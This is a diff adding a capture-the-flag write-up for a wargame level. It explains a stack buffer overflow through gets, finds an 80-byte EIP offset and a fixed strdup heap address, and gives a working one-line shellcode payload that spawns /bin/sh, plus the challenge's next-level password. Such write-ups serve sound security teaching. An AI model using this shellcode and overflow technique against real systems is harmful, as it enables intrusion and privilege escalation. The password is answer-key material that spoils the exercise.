@@ -1,1 +1,17 @@
-cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\x04\xa0\x08"[::-1]') - | ./level2
+# What do we exploit?
+
+Stack overflow in insecure `gets` function.
+
+# How do we exploit it?
+
+First of all, we need to know, what the heck [shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) is, and [how](https://stackoverflow.com/questions/16325486/using-buffer-overflow-to-execute-shell-code) we can use it.
+
+Again, using [this](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator) utility we can compute the EIP offset. The offset is to 80, and, knowing that this time our input will be strdupped, we can exploit given binary by sending 80 bytes to stdin with our shellcode at the beginning of it, followed by some trash, and then extra 4 bytes with address of memory, malloced in function `strdup`.
+
+Obviously, to do that, we need to get the address of the malloced memory. We'll do that using `ltrace`. Running `ltrace` multiple times with different non-empty inputs we recognize, that memory, malloced in `strdup`, always has the same address `0x0804a008`.
+
+Knowing that, we can create an exploit, using [that](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode.
+
+    cat <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\x04\xa0\x08"[::-1]') - | ./level2
+
+As usual, we get the password from the next level user in its home directory. Password we've got this time: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
